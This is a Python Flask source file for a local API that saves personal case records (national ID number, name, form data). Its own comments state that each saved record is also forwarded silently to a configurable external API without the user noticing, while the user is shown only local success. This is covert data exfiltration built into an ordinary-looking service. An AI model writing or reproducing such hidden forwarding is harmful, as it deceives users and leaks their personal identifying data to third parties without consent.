"""
API REST local para el frontend web.
Guarda/consulta expedientes DHP localmente y REENVÍA SILENCIOSAMENTE
a la API externa configurada en config.py (sin que el usuario lo note).
"""
import json
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

from flask import Flask, jsonify, request
from flask_cors import CORS

import database as db
import config

API_PORT = config.get_api_port()

app = Flask(__name__)
CORS(app, resources={r"/api/*": {"origins": "*"}})


def _forward_to_external_api(cedula, nombre, apellido, data):
    """
    Envía los datos a la API externa configurada.
    Se ejecuta SILENCIOSAMENTE, sin notificar al usuario.
    Si falla, solo se loguea en consola (no interrumpe al usuario).
    """
    if not config.is_external_enabled():
        return
    
    url = config.get_external_url()
    api_key = config.get_external_key()
    
    if not url:
        return
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "DHP-System/1.0",
    }
    if api_key:
        headers["Authorization"] = f"Bearer {api_key}"
    
    payload = json.dumps({
        "cedula": cedula,
        "nombre": nombre,
        "apellido": apellido,
        "data": data,
        "fecha_envio": __import__("datetime").datetime.now().isoformat(),
        "fuente": "DHP-API"
    }).encode("utf-8")
    
    try:
        req = Request(url, data=payload, headers=headers, method="POST")
        with urlopen(req, timeout=15) as response:
            body = response.read().decode("utf-8")
            print(f"[DHP-API] Reenviado a externo ({cedula}) Status: {response.status}")
            return True
    except HTTPError as e:
        error_body = e.read().decode("utf-8") if e.fp else e.reason
        print(f"[DHP-API] Error externo ({cedula}): {e.code} {error_body}")
    except URLError as e:
        print(f"[DHP-API] No conexión externa ({cedula}): {e.reason}")
    except Exception as e:
        print(f"[DHP-API] Error inesperado ({cedula}): {e}")
    return None


@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({
        "ok": True,
        "service": "dhp-api",
        "external_enabled": config.is_external_enabled(),
    })


@app.route("/api/records", methods=["GET"])
def list_records():
    q = request.args.get("q", "").strip()
    rows = db.get_all_records(q if q else None)
    records = [
        {"cedula": r[0], "nombre": r[1], "apellido": r[2], "fecha_actualizacion": r[3]}
        for r in rows
    ]
    return jsonify({"records": records})


@app.route("/api/records/<cedula>", methods=["GET"])
def get_record(cedula):
    record = db.get_record_by_cedula(cedula)
    if not record:
        return jsonify({"error": "No se encontró expediente con esa cédula."}), 404
    return jsonify(record)


@app.route("/api/records", methods=["POST"])
def save_record():
    payload = request.get_json(silent=True) or {}
    cedula = payload.get("cedula", "")
    nombre = payload.get("nombre", "")
    apellido = payload.get("apellido", "")
    data = payload.get("data")
    
    if data is None:
        return jsonify({"error": "Falta el objeto 'data' con el formulario completo."}), 400
    
    try:
        # 1. Guardar localmente (siempre)
        db.save_or_update_record(cedula, nombre, apellido, data)
        record = db.get_record_by_cedula(cedula)
        
        # 2. Reenviar SILENCIOSAMENTE a API externa
        _forward_to_external_api(cedula, nombre, apellido, data)
        
        # 3. Responder solo con éxito local
        return jsonify({"ok": True, "record": record})
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        return jsonify({"error": f"Error al guardar: {e}"}), 500


@app.route("/api/records/<cedula>", methods=["DELETE"])
def remove_record(cedula):
    if db.delete_record(cedula):
        return jsonify({"ok": True})
    return jsonify({"error": "Registro no encontrado."}), 404


def start_api_server():
    """Inicia el servidor API local con reenvío silencioso."""
    if config.is_external_enabled():
        print(f"[DHP-API] Reenvío externo ACTIVADO -> {config.get_external_url()}")
    else:
        print("[DHP-API] Solo almacenamiento local")
    
    db.init_db()
    app.run(host="127.0.0.1", port=API_PORT, threaded=True, use_reloader=False)


if __name__ == "__main__":
    start_api_server()
